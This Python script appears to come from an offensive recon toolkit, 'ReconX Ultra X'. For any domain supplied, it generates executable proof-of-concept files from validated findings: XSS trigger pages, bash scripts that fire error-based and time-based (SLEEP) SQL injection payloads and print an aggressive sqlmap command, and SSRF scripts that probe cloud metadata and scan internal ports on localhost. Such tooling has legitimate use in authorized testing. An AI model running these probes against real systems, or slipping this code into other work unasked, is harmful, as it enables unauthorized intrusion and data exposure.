#!/usr/bin/env python3
"""ReconX Ultra X — PoC Generator
Auto-generates Proof of Concept files for validated findings."""
import json, sys, os
from pathlib import Path
from datetime import datetime

DOMAIN = sys.argv[1] if len(sys.argv) > 1 else ""
if not DOMAIN: sys.exit("Usage: poc_generator.py <domain>")

ROOT = Path(__file__).resolve().parent.parent.parent
OUT = ROOT / "output" / DOMAIN
POCS = OUT / "pocs"
for d in [POCS/"xss_pocs", POCS/"sqli_pocs", POCS/"ssrf_pocs", POCS/"curl_pocs"]:
    d.mkdir(parents=True, exist_ok=True)

def lj(p):
    try: return json.loads(Path(p).read_text())
    except: return []

def gen_xss_poc(finding, idx):
    url = finding.get("url", "")
    payload = finding.get("payload", "")
    param = finding.get("param", "")
    poc = f"""<!-- ReconX Ultra X - XSS PoC #{idx} -->
<!-- Generated: {datetime.now().isoformat()} -->
<!-- Target: {url} -->
<!-- Parameter: {param} -->
<!-- Payload: {payload} -->
<!-- Confidence: {finding.get("confidence","")} ({finding.get("score",0)}/100) -->
<html>
<head><title>XSS PoC #{idx} - {DOMAIN}</title></head>
<body style="font-family:monospace;background:#1a1a2e;color:#e94560;padding:2rem">
<h2>⚡ ReconX Ultra X — XSS Proof of Concept</h2>
<table border="1" cellpadding="8" style="border-collapse:collapse;color:#eee">
<tr><td><b>Target</b></td><td>{url}</td></tr>
<tr><td><b>Parameter</b></td><td>{param}</td></tr>
<tr><td><b>Payload</b></td><td><code>{payload}</code></td></tr>
<tr><td><b>Confidence</b></td><td>{finding.get("confidence","")} ({finding.get("score",0)}/100)</td></tr>
<tr><td><b>Validator</b></td><td>{finding.get("source","")}</td></tr>
</table>
<h3>🔗 Trigger URL:</h3>
<a href="{payload or url}" style="color:#00d2ff;word-break:break-all">{payload or url}</a>
<h3>📋 cURL Command:</h3>
<pre style="background:#0f3460;padding:1rem;border-radius:8px;color:#e94560">curl -sk '{url}'</pre>
</body></html>"""
    (POCS / "xss_pocs" / f"xss_poc_{idx}.html").write_text(poc)

def gen_sqli_poc(finding, idx):
    url = finding.get("url", "")
    payload = finding.get("payload", "")
    param = finding.get("param", "")
    dbms = finding.get("dbms", "unknown")
    curl = f"""#!/bin/bash
# ReconX Ultra X - SQLi PoC #{idx}
# Target: {url}
# DBMS: {dbms}
# Confidence: {finding.get("confidence","")} ({finding.get("score",0)}/100)

echo "[*] Testing SQLi on {param}..."
curl -sk '{url}' -o /dev/null -w "Status: %{{http_code}} | Size: %{{size_download}}"
echo ""

# Error-based test
echo "[*] Error-based payload..."
curl -sk '{url.replace(param+"=", param+"="+chr(39))}' -o /dev/null -w "Status: %{{http_code}} | Size: %{{size_download}}"
echo ""

# Time-based test
echo "[*] Time-based payload..."
time curl -sk '{url.replace(param+"=", param+"=1%27+AND+SLEEP(5)--+-")}' -o /dev/null
echo ""

# sqlmap command
echo "[*] Full sqlmap command:"
echo "sqlmap -u '{url}' -p '{param}' --batch --level=3 --risk=2"
"""
    (POCS / "sqli_pocs" / f"sqli_poc_{idx}.sh").write_text(curl)
    os.chmod(POCS / "sqli_pocs" / f"sqli_poc_{idx}.sh", 0o755)

def gen_ssrf_poc(finding, idx):
    url = finding.get("url", "")
    payload = finding.get("payload", "")
    curl = f"""#!/bin/bash
# ReconX Ultra X - SSRF PoC #{idx}
# Target: {url}
# Confidence: {finding.get("confidence","")} ({finding.get("score",0)}/100)

echo "[*] AWS Metadata test..."
curl -sk '{url}' | head -20
echo ""

echo "[*] Internal port scan via SSRF..."
for port in 80 443 8080 8443 9200 6379 27017; do
    echo -n "Port $port: "
    curl -sk --max-time 3 '{url.split("?")[0]}?url=http://127.0.0.1:'$port -o /dev/null -w "%{{http_code}}"
    echo ""
done
"""
    (POCS / "ssrf_pocs" / f"ssrf_poc_{idx}.sh").write_text(curl)
    os.chmod(POCS / "ssrf_pocs" / f"ssrf_poc_{idx}.sh", 0o755)

def gen_curl_pocs(findings):
    """Generate a master curl commands file for all findings."""
    lines = [f"#!/bin/bash", f"# ReconX Ultra X — All Validated Finding PoCs", f"# Domain: {DOMAIN}", f"# Generated: {datetime.now().isoformat()}", ""]
    for f in findings:
        lines.append(f"# [{f.get('type','')}] Score: {f.get('score',0)} | {f.get('confidence','')}")
        lines.append(f"curl -sk '{f.get('url','')}'")
        lines.append("")
    (POCS / "curl_pocs" / "all_validated_curls.sh").write_text("\n".join(lines))
    os.chmod(POCS / "curl_pocs" / "all_validated_curls.sh", 0o755)

def main():
    print(f"  📝 PoC Generator — {DOMAIN}")
    
    all_validated = lj(OUT / "validated/all_validated.json")
    if not isinstance(all_validated, list):
        all_validated = []
    
    xss_count = sqli_count = ssrf_count = 0
    
    for i, f in enumerate(all_validated, 1):
        t = f.get("type", "")
        if t == "XSS":
            xss_count += 1
            gen_xss_poc(f, xss_count)
        elif t == "SQLi":
            sqli_count += 1
            gen_sqli_poc(f, sqli_count)
        elif t == "SSRF":
            ssrf_count += 1
            gen_ssrf_poc(f, ssrf_count)
    
    gen_curl_pocs(all_validated)
    
    total = xss_count + sqli_count + ssrf_count
    print(f"    ✅ Generated {total} PoCs (XSS:{xss_count} SQLi:{sqli_count} SSRF:{ssrf_count})")

if __name__ == "__main__": main()
